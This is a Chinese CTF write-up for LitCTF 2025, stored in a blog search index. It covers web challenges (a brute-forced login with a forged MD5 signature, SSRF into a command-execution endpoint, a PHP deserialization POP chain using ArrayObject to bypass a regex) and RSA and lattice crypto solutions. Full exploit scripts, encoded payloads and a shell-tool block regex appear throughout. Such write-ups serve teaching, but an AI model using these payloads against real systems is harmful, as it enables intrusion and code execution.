<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>LitCTF2025-WriteUp</title>
    <url>/2025/05/26/LitCTF2025-WriteUp/</url>
    <content><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-signin-爆破时间戳"><a href="#ez-signin-爆破时间戳" class="headerlink" title="ez_signin(爆破时间戳)"></a>ez_signin(爆破时间戳)</h3><p><img src="/../images/20250526142007399.png" alt="image-20250526142007399"></p>
<p>一进去是403</p>
<p>扫目录扫出来<code>/login.html</code>，访问</p>
<p><img src="/../images/20250526142152871.png" alt="image-20250526142152871"></p>
<p>一个文档管理系统</p>
<p>先来爆破一下这个登录系统</p>
<p>抓包，爆破username和password</p>
<p>爆破出来用户名和密码为<strong>admin&#x2F;admin123</strong></p>
<p>但当登录的时候显示签名错误</p>
<p>来看JS源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        const loginBtn = document.getElementById(&#x27;loginBtn&#x27;);</span><br><span class="line">        const passwordInput = document.getElementById(&#x27;password&#x27;);</span><br><span class="line">        const errorTip = document.getElementById(&#x27;errorTip&#x27;);</span><br><span class="line">        const rawUsername = document.getElementById(&#x27;username&#x27;).value; </span><br><span class="line"></span><br><span class="line">        loginBtn.addEventListener(&#x27;click&#x27;, async () =&gt; &#123;</span><br><span class="line">            const rawPassword = passwordInput.value.trim();</span><br><span class="line">            if (!rawPassword) &#123;</span><br><span class="line">                errorTip.textContent = &#x27;请输入密码&#x27;;</span><br><span class="line">                errorTip.classList.add(&#x27;show&#x27;);</span><br><span class="line">                passwordInput.focus();</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            const md5Username = CryptoJS.MD5(rawUsername).toString();   </span><br><span class="line">            const md5Password = CryptoJS.MD5(rawPassword).toString();   </span><br><span class="line"></span><br><span class="line">     </span><br><span class="line">            const shortMd5User = md5Username.slice(0, 6);  </span><br><span class="line">            const shortMd5Pass = md5Password.slice(0, 6);  </span><br><span class="line"></span><br><span class="line">          </span><br><span class="line">            const timestamp = Date.now().toString(); //五分钟</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">            const secretKey = &#x27;easy_signin&#x27;;  </span><br><span class="line">            const sign = CryptoJS.MD5(shortMd5User + shortMd5Pass + timestamp + secretKey).toString();</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                const response = await fetch(&#x27;login.php&#x27;, &#123;</span><br><span class="line">                    method: &#x27;POST&#x27;,</span><br><span class="line">                    headers: &#123;</span><br><span class="line">                        &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span><br><span class="line">                        &#x27;X-Sign&#x27;: sign  </span><br><span class="line">                    &#125;,</span><br><span class="line">                    body: new URLSearchParams(&#123;</span><br><span class="line">                        username: md5Username,   </span><br><span class="line">                        password: md5Password,   </span><br><span class="line">                        timestamp: timestamp</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">                const result = await response.json();</span><br><span class="line">                if (result.code === 200) &#123;</span><br><span class="line">                    alert(&#x27;登录成功！&#x27;);</span><br><span class="line">                    window.location.href = &#x27;dashboard.php&#x27;; </span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    errorTip.textContent = result.msg;</span><br><span class="line">                    errorTip.classList.add(&#x27;show&#x27;);</span><br><span class="line">                    passwordInput.value = &#x27;&#x27;;</span><br><span class="line">                    passwordInput.focus();</span><br><span class="line">                    setTimeout(() =&gt; errorTip.classList.remove(&#x27;show&#x27;), 3000);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                errorTip.textContent = &#x27;网络请求失败&#x27;;</span><br><span class="line">                errorTip.classList.add(&#x27;show&#x27;);</span><br><span class="line">                setTimeout(() =&gt; errorTip.classList.remove(&#x27;show&#x27;), 3000);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        passwordInput.addEventListener(&#x27;input&#x27;, () =&gt; &#123;</span><br><span class="line">            errorTip.classList.remove(&#x27;show&#x27;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这里是用<strong>md5(用户名)+md5(密码)+时间戳+secret_key</strong>作为签名，放在请求头来验证</p>
<p>这里的<strong>secret_key &#x3D; “easy_signin”</strong></p>
<p>所以现在只需要爆破时间戳就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 目标地址</span><br><span class="line">url = &quot;http://node6.anna.nssctf.cn:21669/login.php&quot;  # ← 改成你的实际地址</span><br><span class="line"></span><br><span class="line"># 固定信息</span><br><span class="line">username = &quot;admin&quot;</span><br><span class="line">password = &quot;admin123&quot;</span><br><span class="line">secret_key = &quot;easy_signin&quot;</span><br><span class="line"></span><br><span class="line"># 当前时间戳（单位：毫秒）</span><br><span class="line">timestamp = str(int(time.time() * 1000))</span><br><span class="line"></span><br><span class="line"># 加密处理</span><br><span class="line">md5_username = hashlib.md5(username.encode()).hexdigest()</span><br><span class="line">md5_password = hashlib.md5(password.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">short_md5_user = md5_username[:6]</span><br><span class="line">short_md5_pass = md5_password[:6]</span><br><span class="line"></span><br><span class="line">sign_raw = short_md5_user + short_md5_pass + timestamp + secret_key</span><br><span class="line">sign = hashlib.md5(sign_raw.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"># 构造请求头和数据</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;X-Sign&quot;: sign</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;username&quot;: md5_username,</span><br><span class="line">    &quot;password&quot;: md5_password,</span><br><span class="line">    &quot;timestamp&quot;: timestamp</span><br><span class="line">&#125;</span><br><span class="line">proxies=&#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8088&#x27;&#125;</span><br><span class="line"># 发起请求</span><br><span class="line">response = requests.post(url, headers=headers, data=data,proxies=proxies)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    print(&quot;[响应状态码]:&quot;, response.status_code)</span><br><span class="line">    print(&quot;[响应内容]:&quot;, response.text)</span><br><span class="line">    print(timestamp)</span><br><span class="line">    print(sign)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(&quot;[错误]:&quot;, e)</span><br><span class="line"></span><br><span class="line">for key, value in response.headers.items():</span><br><span class="line">    print(f&quot;&#123;key&#125;: &#123;value&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>抓包该脚本</p>
<p><img src="/../images/0250527160238492.png" alt="image-20250527160238492"></p>
<p>在浏览器改该脚本得到的cookie</p>
<p>再访问题目给的目录<strong>dashboard.php</strong></p>
<p><img src="/../images/20250527160404128.png" alt="image-20250527160404128"></p>
<p>成功,访问&#x2F;backup&#x2F;8e0132966053d4bf8b2dbe4ede25502b.php</p>
<p>但这里显示没权限访问</p>
<p>注意到有 api.js。访问得到一个 api 路由：&#x2F;api&#x2F;sys&#x2F;urlcode.php?url&#x3D;</p>
<p>访问<code>/api/sys/urlcode.php?url=127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php</code></p>
<p>得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="string">&quot;waf&quot;</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\b(nc|bash|sh)\b/i&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;waf!!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/more|less|head|sort/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;waf&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/tail|sed|cut|awk|strings|od|ping/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;waf!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$name</span>, <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;执行结果：\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n返回码：<span class="subst">$return_var</span>&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;非本地用户&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意到必须是本地请求。那么就靠 api 接口打 SSRF</p>
<p>尝试<code>/api/sys/urlcode.php?url=http://127.0.0.1/backup/8e0132966053d4bf8b2dbe4ede25502b.php?name=ls%2520../</code></p>
<p>有</p>
<p><img src="/../images/20250527144040972.png" alt="image-20250527144040972"></p>
<p>直接访问 &#x2F;327a6c4304ad5938eaf0efb6cc3e53dc.php 得到 flag</p>
<h3 id="君の名はwp"><a href="#君の名はwp" class="headerlink" title="君の名はwp"></a>君の名はwp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">create_function(&quot;&quot;, &#x27;die(`/readflag`);&#x27;);</span><br><span class="line">class Taki</span><br><span class="line">&#123;</span><br><span class="line">    private $musubi;</span><br><span class="line">    private $magic;</span><br><span class="line">    public function __unserialize(array $data)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;musubi = $data[&#x27;musubi&#x27;];</span><br><span class="line">        $this-&gt;magic = $data[&#x27;magic&#x27;];</span><br><span class="line">        return ($this-&gt;musubi)();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($func,$args)&#123;</span><br><span class="line">        (new $args[0]($args[1]))-&gt;&#123;$this-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Mitsuha</span><br><span class="line">&#123;</span><br><span class="line">    private $memory;</span><br><span class="line">    private $thread;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;memory.$this-&gt;thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class KatawareDoki</span><br><span class="line">&#123;</span><br><span class="line">    private $soul;</span><br><span class="line">    private $kuchikamizake;</span><br><span class="line">    private $name;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;soul)-&gt;flag($this-&gt;kuchikamizake,$this-&gt;name);</span><br><span class="line">        return &quot;call error!no flag!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$Litctf2025 = $_POST[&#x27;Litctf2025&#x27;];</span><br><span class="line">if(!preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $Litctf2025))&#123;</span><br><span class="line">    unserialize($Litctf2025);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个题当时比赛的时候没多少时间了，也没仔细看，但仔细一看发现确实不会</p>
<p>利用点很容易找到</p>
<p>就是<strong>Taki::__call</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(new $args[0]($args[1]))-&gt;&#123;$this-&gt;magic&#125;();</span><br></pre></td></tr></table></figure>

<p>可以简化一下来看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(new A(B))-&gt;&#123;C&#125;();</span><br><span class="line">//A=$args[0]</span><br><span class="line">//B=$args[1]</span><br><span class="line">//C=$this-&gt;magic</span><br></pre></td></tr></table></figure>

<p>new A(B)是实例了一个类</p>
<p> (new A(B))-&gt;{C}();调用这个类的一个方法，但这个方法的参数只能为空，可以尝试调用简单的phpinfo()等无参函数。</p>
<p>再来看<code>create_function(&quot;&quot;, &#39;die(/readflag);&#39;);</code></p>
<p>用create_function创建了一个匿名函数，直接执行了&#x2F;readflag，也就是说只要调用这个匿名函数就能输出flag，于是我们的思路就清楚了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到一个可以调用匿名函数的原生类</span><br><span class="line"></span><br><span class="line">找到匿名函数的名字</span><br></pre></td></tr></table></figure>

<p>直接搜发现<strong>ReflectionFunction的invoke方法可以调用函数</strong></p>
<p>基本用法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 定义一个简单的函数</span><br><span class="line">function greet($name) &#123;</span><br><span class="line">    return &quot;Hello, &quot; . $name . &quot;!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 创建 ReflectionFunction 实例</span><br><span class="line">$reflection = new ReflectionFunction(&#x27;greet&#x27;);</span><br><span class="line"></span><br><span class="line">// 使用 invoke 调用函数</span><br><span class="line">$result = $reflection-&gt;invoke(&#x27;World&#x27;);</span><br><span class="line"></span><br><span class="line">echo $result; // 输出: Hello, World!</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ReflectionFunction的参数就是要调用的函数名，invoke的参数就是被调函数的参数，这个用法和我们的利用思路刚好吻合，invoke不用传参数。</p>
<p>我们来调用的话就是**(new ReflectionFunction(匿名函数名称))-&gt;invoke()**</p>
<p>现在只需要找到匿名函数名称</p>
<p>匿名函数的函数名是会改变的，在web页面中打开php文件，每刷新一次函数名的数字就会加一，<code>\000lambda_1</code>只是第一次访问题目环境时匿名函数的名字，所以最好是重新开启一个环境来提交payload，这样我们的匿名函数就是<code>\000lambda_1</code></p>
<h4 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a><strong>构造pop链</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Taki::__unserialize-&gt;Mitsuha::__invoke-&gt;KatawareDoki::toString-&gt;Taki::__call</span><br></pre></td></tr></table></figure>

<p>这里我们通过<code>__toStringh</code>触发__call时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;soul)-&gt;flag($this-&gt;kuchikamizake,$this-&gt;name);</span><br><span class="line">        return &quot;call error!no flag!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function __call($func,$args)&#123;</span><br><span class="line">        (new $args[0]($args[1]))-&gt;&#123;$this-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>__call</code>里面的参数$func是不存在的函数名，即__toString里面的flag函数</p>
<p>而参数$args即flag函数传的参数</p>
<p><code>$args[0]</code>是<code>$this-&gt;kuchikamizake</code>，<code>$args[1]</code>是<code>$this-&gt;name</code></p>
<h4 id="绕过preg-match-Oa-d-i-Litctf2025"><a href="#绕过preg-match-Oa-d-i-Litctf2025" class="headerlink" title="绕过preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $Litctf2025)"></a><strong><code>绕过preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $Litctf2025)</code></strong></h4><p>正则表达式<code>/^[Oa]:[\d]+/i</code>检查序列化字符串是否以对象(<code>O:</code>)或数组(<code>a:</code>)开头，后跟数字</p>
<p>根据提示把O变成C，因此我们需要<strong>用一个类来对链子进行包装，然后开头的O就会被自动转换为C</strong></p>
<p>**例题：2023愚人杯3rd [easy_php]**：[愚人杯3rd [easy_php] - Boogiepop Doesn’t Laugh](<a href="https://boogipop.com/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd">https://boogipop.com/2023/04/02/愚人杯3rd</a> [easy_php]&#x2F;)</p>
<p>用内置类<strong>ArrayObject</strong>，这个内置类序列化结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$arr=array(&quot;a&quot;=&gt;1,&quot;b&quot;=&gt;2);</span><br><span class="line">$ao=new ArrayObject($arr);</span><br><span class="line">echo serialize($ao);</span><br></pre></td></tr></table></figure>

<p><img src="/../images/20250527153135735.png" alt="image-20250527153135735"></p>
<p>可以看到是C开头的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">绕过正则的化</span><br><span class="line">这里用一个类来对链子进行包装，然后开头的O就会被自动转换为C</span><br><span class="line">可以使用的类有很多：</span><br><span class="line"></span><br><span class="line">ArrayObject::unserialize</span><br><span class="line">ArrayIterator::unserialize</span><br><span class="line">RecursiveArrayIterator::unserialize</span><br><span class="line">SplObjectStorage::unserialize</span><br></pre></td></tr></table></figure>

<h4 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Taki</span><br><span class="line">&#123;</span><br><span class="line">    public $musubi;</span><br><span class="line">    public $magic = &quot;invoke&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Mitsuha</span><br><span class="line">&#123;</span><br><span class="line">    public $memory;</span><br><span class="line">    public $thread;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class KatawareDoki</span><br><span class="line">&#123;</span><br><span class="line">    public $soul;</span><br><span class="line">    public $kuchikamizake = &quot;ReflectionFunction&quot;;</span><br><span class="line">    public $name = &quot;\000lambda_1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Taki();</span><br><span class="line">$b = new Mitsuha();</span><br><span class="line">$c = new KatawareDoki();</span><br><span class="line"></span><br><span class="line">$a-&gt;musubi = $b;		// 1.把对象当成函数调用，触发__invoke()</span><br><span class="line">$b-&gt;thread = $c;		// 2. 把对象作为字符串使用，触发__toString()</span><br><span class="line">$c-&gt;soul = $a;			// 3. 调用不存在的方法，触发__call()</span><br><span class="line"></span><br><span class="line">$arr=array(&quot;evil&quot;=&gt;$a);</span><br><span class="line">$d=new ArrayObject($arr);</span><br><span class="line">echo urlencode(serialize($d));</span><br><span class="line"></span><br><span class="line">//C%3A11%3A%22ArrayObject%22%3A244%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A6%3A%22memory%22%3BN%3Bs%3A6%3A%22thread%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A4%3A%22soul%22%3Br%3A4%3Bs%3A13%3A%22kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A4%3A%22name%22%3Bs%3A9%3A%22%00lambda_1%22%3B%7D%7Ds%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D</span><br></pre></td></tr></table></figure>

<p>如果不对，直接将\00lambda_%d进行爆破</p>
<h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p>直接在<code>return ($this-&gt;musubi)();</code>处调用匿名函数</p>
<p><strong>exp:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Taki</span><br><span class="line">&#123;</span><br><span class="line">    public $musubi = &quot;\000lambda_1&quot;;</span><br><span class="line">    public $magic = &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Taki();</span><br><span class="line"></span><br><span class="line">$arr=array(&quot;evil&quot;=&gt;$a);</span><br><span class="line">$d=new ArrayObject($arr);</span><br><span class="line">echo urlencode(serialize($d));</span><br><span class="line"></span><br><span class="line">//Litctf2025=C%3A11%3A%22ArrayObject%22%3A95%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3Bs%3A9%3A%22%00lambda_1%22%3Bs%3A5%3A%22magic%22%3Bs%3A0%3A%22%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D</span><br></pre></td></tr></table></figure>



<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from enc import flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = 65537</span><br><span class="line">p,q = getPrime(1024),getPrime(1024)</span><br><span class="line">n = p*q</span><br><span class="line">noise = getPrime(40)</span><br><span class="line">tmp1 = noise*p+noise*q</span><br><span class="line">tmp2 = noise*noise</span><br><span class="line">hint = p*q+tmp1+tmp2</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(f&quot;n = &#123;n&#125;&quot;)</span><br><span class="line">print(f&quot;e = &#123;e&#125;&quot;)</span><br><span class="line">print(f&quot;c = &#123;c&#125;&quot;)</span><br><span class="line">print(f&quot;hint = &#123;hint&#125;&quot;)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">n = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565066224724927142875488372745811265526082952677738164529563954987228906850399133238995317510054164641775620492640261304545177255239344267408541100183257566363663184114386155791750269054370153318333985294770328952530538998873255288249682710758780563400912097941615526239960620378046855974566511497666396320752739097426013141</span><br><span class="line">e = 65537</span><br><span class="line">c = 1443781085228809103260687286964643829663045712724558803386592638665188285978095387180863161962724216167963654290035919557593637853286347618612161170407578261345832596144085802169614820425769327958192208423842665197938979924635782828703591528369967294598450115818251812197323674041438116930949452107918727347915177319686431081596379288639254670818653338903424232605790442382455868513646425376462921686391652158186913416425784854067607352211587156772930311563002832095834548323381414409747899386887578746299577314595641345032692386684834362470575165392266454078129135668153486829723593489194729482511596288603515252196</span><br><span class="line">hint = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565315879035806034866363781260326863226820493638303543900551786806420978685834963920605455531498816171226961859405498825422799670404315599803610007692517859020686506546933013150302023167306580068646104886750772590407299332549746317286972954245335810093049085813683948329319499796034424103981702702886662008367017860043529164</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>题目给了三个式子、</p>
<p><img src="/../images/20250527170322274.png" alt="image-20250527170322274"></p>
<p>我们对等式进行变形</p>
<p><img src="/../images/20250527170338861.png" alt="image-20250527170338861"></p>
<p>那么hint-n就是两个数之积了，同时noise很小，yafu在有限的时间内可以分解，但是factordb上存有已有的分解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hint-n=249654310878891990875408514515597700737540960565379370987831819192071835435830681610138021444651529451341366765237520877622415164971332395068907509260292657023322432546857358551754112936426750312119591980443637876760333676491029037290243486555246692136987872068422089358879417987568129415191205220265687614278762617516023</span><br></pre></td></tr></table></figure>

<p>在factordb上分解hint-n</p>
<p>得到</p>
<p><img src="/../images/20250527170613304.png" alt="image-20250527170613304"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">19</span><br><span class="line">942430120937</span><br><span class="line">13942360585323048470909846656964572704513299405546046811010328770033198426421576349568926279384369628072261252513038693891801832793244205614823946991510903118232135334563566099595180800155562142673080500174590397281272043792295225345391996291640336108556360227747859478557651612788250116887738800942290148741</span><br></pre></td></tr></table></figure>

<p>第二个就是noise，第三个就是p+q，直接解方程得到pq，然后rsa</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># python3.11.4</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">n = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565066224724927142875488372745811265526082952677738164529563954987228906850399133238995317510054164641775620492640261304545177255239344267408541100183257566363663184114386155791750269054370153318333985294770328952530538998873255288249682710758780563400912097941615526239960620378046855974566511497666396320752739097426013141</span><br><span class="line">e = 65537</span><br><span class="line">c = 1443781085228809103260687286964643829663045712724558803386592638665188285978095387180863161962724216167963654290035919557593637853286347618612161170407578261345832596144085802169614820425769327958192208423842665197938979924635782828703591528369967294598450115818251812197323674041438116930949452107918727347915177319686431081596379288639254670818653338903424232605790442382455868513646425376462921686391652158186913416425784854067607352211587156772930311563002832095834548323381414409747899386887578746299577314595641345032692386684834362470575165392266454078129135668153486829723593489194729482511596288603515252196</span><br><span class="line">hint = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565315879035806034866363781260326863226820493638303543900551786806420978685834963920605455531498816171226961859405498825422799670404315599803610007692517859020686506546933013150302023167306580068646104886750772590407299332549746317286972954245335810093049085813683948329319499796034424103981702702886662008367017860043529164</span><br><span class="line"></span><br><span class="line"># print(hint - n)</span><br><span class="line">noise = 942430120937</span><br><span class="line">p_plus_q = (hint - n - noise**2) // noise</span><br><span class="line">phi = n + 1 - p_plus_q</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"># LitCTF&#123;db6f52b9265971910b306754b9df8b76&#125;</span><br></pre></td></tr></table></figure>

<h3 id="baby"><a href="#baby" class="headerlink" title="baby"></a>baby</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from enc import flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">g = getPrime(512)</span><br><span class="line">t = getPrime(150)</span><br><span class="line">data = (t * gmpy2.invert(m, g)) % g</span><br><span class="line">print(f&#x27;g = &#123;g&#125;&#x27;)</span><br><span class="line">print(f&#x27;data = &#123;data&#125;&#x27;)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">g = 7835965640896798834809247993719156202474265737048568647376673642017466116106914666363462292416077666356578469725971587858259708356557157689066968453881547</span><br><span class="line">data = 2966297990428234518470018601566644093790837230283136733660201036837070852272380968379055636436886428180671888655884680666354402224746495312632530221228498</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>由题意知</p>
<p><img src="/../images/20250527171539298.png" alt="image-20250527171539298"></p>
<p>所以</p>
<p><img src="/../images/20250527171555075.png" alt="image-20250527171555075"></p>
<p>即</p>
<p><img src="/../images/20250527171608627.png" alt="image-20250527171608627"></p>
<p>造格</p>
<p><img src="/../images/20250527171626049.png" alt="image-20250527171626049"></p>
<p>做一点参数调整即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sage10.6</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">g = 7835965640896798834809247993719156202474265737048568647376673642017466116106914666363462292416077666356578469725971587858259708356557157689066968453881547</span><br><span class="line">data = 2966297990428234518470018601566644093790837230283136733660201036837070852272380968379055636436886428180671888655884680666354402224746495312632530221228498</span><br><span class="line">i = 128</span><br><span class="line">Ge = Matrix(ZZ,[</span><br><span class="line">    [1,data],</span><br><span class="line">    [0,g]</span><br><span class="line">])</span><br><span class="line">Ge[:,-1] *= 2^i</span><br><span class="line">m,t = Ge.LLL()[0]</span><br><span class="line">m,t = abs(m),abs(t) // 2^i</span><br><span class="line">if t.bit_length() == 150:</span><br><span class="line">    print(long_to_bytes(m))</span><br><span class="line"># LitCTF&#123;56008a819331c9f3608a718327b7e6ce&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>比赛复现</category>
      </categories>
      <tags>
